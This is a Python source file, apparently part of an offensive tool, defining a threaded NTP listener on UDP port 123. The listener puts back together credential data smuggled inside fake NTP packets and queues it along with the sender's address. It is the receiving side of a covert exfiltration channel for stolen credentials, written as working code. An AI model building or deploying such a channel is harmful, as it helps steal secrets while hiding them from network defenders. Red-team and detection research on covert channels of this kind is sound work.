import threading
import collections
from scapy.all import *

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "2.020"


class NTPModule(threading.Thread):
    """
    Class to observe NTP packets
    and decrypt credentials
    """
    def __init__(self, q, conf):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.q = q
        self.debug = conf['DEBUG']
        self.magic = conf['MAGIC']
        self.iface = conf['IFACE']
        self.dic = {}
        self.pkttotal = 200
        self.pktlen = 0
        self.ssocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.ssocket.bind(('0.0.0.0', 123))

    def run(self):
        while not self.stoprequest.isSet():
            buf, address = self.ssocket.recvfrom(200)
            if buf:
                buflen = len(buf)
                full = buf[buflen-48:buflen].hex()
                if full[2:4] == '10':
                    if full[4:6] == '00':
                        self.pktlen = int(full[6:8], 16)
                    else:
                        self.pktlen = ord(bytes.fromhex(full[4:8]).decode())
                    if self.pktlen % 8 != 0:
                        self.pkttotal = int(self.pktlen / 8 + 1)
                    else:
                        self.pkttotal = int(self.pktlen / 8)
                    self.dic = {}
                elif full[2:4] == '00':
                    self.dic[int(full[4:6], 16)] = full[88:96]
                elif full[2:4] == '63':
                    self.q.put((self.magic, address[0]))

                if len(self.dic) == self.pkttotal:
                    odic = collections.OrderedDict(sorted(self.dic.items()))
                    final = ''
                    for value in odic.items():
                        final = final + value[1]
                    encrypted = final[:self.pktlen]
                    self.q.put((encrypted, address[0]))
                    self.dic = {}
                    self.pkttotal = 200
                    self.pktlen = 0
            buf = ''

    def join(self):
        self.stoprequest.set()
